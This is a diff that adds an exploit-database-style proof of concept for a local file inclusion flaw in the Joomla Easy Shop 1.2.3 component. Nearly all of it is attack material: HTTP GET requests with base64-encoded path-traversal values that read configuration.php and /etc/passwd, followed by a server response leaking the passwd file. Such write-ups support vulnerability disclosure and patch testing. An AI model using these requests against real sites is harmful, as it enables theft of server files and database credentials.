@@ -1,0 +1,54 @@
+# Exploit Title: Joomla! Component Easy Shop 1.2.3 - Local File Inclusion
+# Dork: N/A
+# Date: 2019-01-22
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://joomtech.net/
+# Software D.: https://www.joomtech.net/products/easyshop?task=file.download&key=7bafaa65995fb3b1383328105df1e10f
+# Software Link: https://extensions.joomla.org/extensions/extension/e-commerce/shopping-cart/easy-shop/
+# Version: 1.2.3
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php?option=com_easyshop&task=ajax.loadImage&file=[BASE64_FILE_NAME]
+# 
+
+GET /[PATH]/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA= HTTP/1.1
+GET /[PATH]/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA== HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Cookie: __cfduid=d11dd4447c0b8ef3cd8c4f6745ebdf50e1548111108; 6eecafb7a7a944789bd299deac1ff945=osde04ob1pgq9o3p8arfqtbobk
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Mon, 21 Jan 2019 23:58:02 GMT
+Content-Type: text/plain;charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+Expect-CT: max-age=604800, report-uri="http://localhost/[PATH]/"
+Server: cloudflare
+CF-RAY: 49cd621bce8f537e-LAX
+Content-Encoding: br
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+....
